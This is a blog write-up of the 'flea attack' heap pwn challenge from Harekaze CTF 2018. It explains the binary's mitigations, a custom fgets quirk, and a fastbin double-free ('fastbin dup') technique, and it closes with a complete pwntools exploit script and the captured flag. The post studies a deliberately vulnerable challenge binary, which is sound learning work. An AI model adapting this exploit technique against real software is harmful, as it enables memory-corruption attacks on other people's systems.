---
layout: post
title: "flea attack"
---
# flea attack - harekaze ctf 2018 

nc problem.harekaze.com 20175

file: [flea_attack](https://problem.harekaze.com/3bac5c3a7bbcd9b58013de928a4e7ee5b7b6b4c59b0bb8ebbb5def90a7364f8b/flea_attack/flea_attack.elf)

(Pwn, 200 points)

i was unable to finish this problem during the ctf but got pretty close. i read a solution afterwards and ensured that i understood what i did wrong. here's my notes!

i started by checking the binary mitigations in place:

```
[*] '/home/vagrant/harekaze/flea-attack/flea_attack.elf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x200000)
```

after running the binary i could tell this was likely a heap related memory corruption vulnerability since it was using malloc to store our name:

```
puts("1. Add name"1. Add name
)                                                                                                   = 12
puts("2. Delete name"2. Delete name
)                                                                                                = 15
puts("3. Exit"3. Exit
)                                                                                                       = 8
printf("> "> )                                                                                                          = 2
fgets(1
"1\n", 11, 0x7f46a20828e0)                                                                                      = 0x7ffe9ed3de1c
atoi(0x7ffe9ed3de1c, 0x7f46a2082963, 0x7f46a2084790, 0x7f46a1db5230)                                                  = 1
printf("Size: "Size: )                                                                                                      = 6
fgets(16
"16\n", 11, 0x7f46a20828e0)                                                                                     = 0x7ffe9ed3dddc
atoi(0x7ffe9ed3dddc, 0x7f46a2082963, 0x7f46a2084790, 0x7f46a1db5230)                                                  = 16
malloc(16)                                                                                                            = 0x900250
printf("Name: "Name: )                                                                                                      = 6
read(0fizbaz
, "fizbaz\n", 16)
```

likely a use after free of some kind since we can also free our name with the delete functionality. i could also tell that the address of our flag in memory is given to us:

```
\__libc_start_main(0x201430, 1, 0x7fff61b66a48, 0x201560 <unfinished ...>
setvbuf(0x7fcc663d08e0, 0, 2, 0)                                                    = 0
setvbuf(0x7fcc663d1620, 0, 2, 0)                                                    = 0
setvbuf(0x7fcc663d1540, 0, 2, 0)                                                    = 0
fopen("/home/flea_attack/flag", "r")                                                = 0xe6d010
fgets("flag{flea-attack}\n", 48, 0xe6d010)                                          = 0x204080
printf("Some comment this note:"Some comment this note:)                                                   = 23
read(0^C <no return ...>
--- SIGINT (Interrupt) ---
+++ killed by SIGINT +++
```

since there was no obvious way to redirect execution simply with the name allocations i decided to look into other options, i've been playing with the examples in team shellphish's [how2heap](https://github.com/shellphish/how2heap) repository lately and found [one](https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c) that was directly applicable to this challenge; 'fastbin dup into stack' which allows one to trick malloc into returning a chunk of memory in segments other than the heap.

i was able to get this working in the flea\_attack challenge by adding 3 names of the same size (call them a, b, and c) delete name a, followed by b, followed by a again, add name a again with the same size and the name <address of flag - some offset>, add name d, e of the same size and finally name f of the same size but this time with enough characters to fill our offset from <address of flag>. the only caveat is i needed to provide the fake chunk size in the debugger. i couldn't figure out how to do this with the pwn script. my idea was that i could provide the fake size with the initial prompt which asks the user for a comment. this much i was right about however i couldn't figure out how to provide a fake chunk size that malloc trusted. i kept getting errors like ```*** Error in './flea_attack.elf': malloc(): memory corruption (fast): 0x000000000184e240```. in gdb when using a fake size of 0x20 and a chunk size of 16 i was able to get the flag. the part i couldn't figure out in time was how to bypass the appending of the newline character in our comment which i was using to write our fake chunk size.looking back it was such a silly thing to get stuck on!! here's the code responsible for this functionality decompiled in hexrays:

```C
unsigned int original_fgets(char *buf, unsigned int sz) {
    char *result;
    unsigned int i;
    for (i = 0; ++i) {
        result = i;
        if (i >= sz - 1) break;
        read(0, buf+i; 1);
        if ( !( *(buf+i) ) ) {
            *(buf + i) = '\n';
LABEL_7:
            result = buf;
            *(buf + 1 + i) = 0;
            return result;
        }
        if ( *(buf + i) == '\n' ) {
            goto LABEL_7;
        }
    }
}
```

it looks like we had an 'fgets' written just for us! looking at this now all we had to do was figure out that if we wrote our own newline in our input then it would leave the bytes in our buffer as they are (null bytes) effectively allowing us to write 0x00000020 or whatever other size we'd like to our fake size and set up the chunk so that the fake size lands right at the end of our input.

here's my final solution:

```python
#!/usr/bin/python

from pwn import *

host = 'problem.harekaze.com'
port = 20175

REMOTE = True
#REMOTE = False
DEBUG = False
#DEBUG = True

def getpipe():
    if REMOTE:
        return remote(host,port)
    return process('./flea_attack.elf')

def add_name(name, sz):
    global r
    r.recvuntil('> ')
    r.sendline('1')
    r.recvuntil('ze: ')
    r.sendline('{}'.format(sz))
    r.recvuntil('me: ')
    r.sendline('{}'.format(name))
    r.recvuntil('ddr: ')
    return r.recvline()

def flag_name(name, sz):
    global r
    r.recvuntil('> ')
    r.sendline('1')
    r.recvuntil('ze: ')
    r.sendline('{}'.format(sz))
    r.recvuntil('me: ')
    r.sendline('{}'.format(name))
    log.success(r.recvuntil('ddr: '))
    return r.recvline()

def delete_name(addr):
    global r
    r.recvuntil('> ')
    r.sendline('2')
    r.recvuntil('ddr: ')
    r.sendline('{}'.format(addr))

gdbscript = '''
b original_fgets
'''

r = getpipe()

if DEBUG:
    gdb.attach(r, gdbscript)

r.recvuntil('note:')

r.sendline('a' * 94 + p8(0x71))

sz = 96

a = add_name('aaaaaaa', sz)
b = add_name('bbbbbbb', sz)
c = add_name('ccccccc', sz)

delete_name(a)
delete_name(b)
delete_name(a)

flag = 0x204056

log.info('flag is at: {}'.format(hex(flag)))

a = add_name(p64(flag), sz)

add_name('AAAA', sz)
add_name('BBBB', sz)

flag_name('A'*25, sz)
'''
[+] Opening connection to problem.harekaze.com on port 20175: Done
[*] flag is at: 0x204056
[+] Done!
    Name: AAAAAAAAAAAAAAAAAAAAAAAAA
    HarekazeCTF{5m41l_smal1_f1ea_c0n7rol_7h3_w0rld}
    Addr: 
[*] Closed connection to problem.harekaze.com port 20175
'''
```
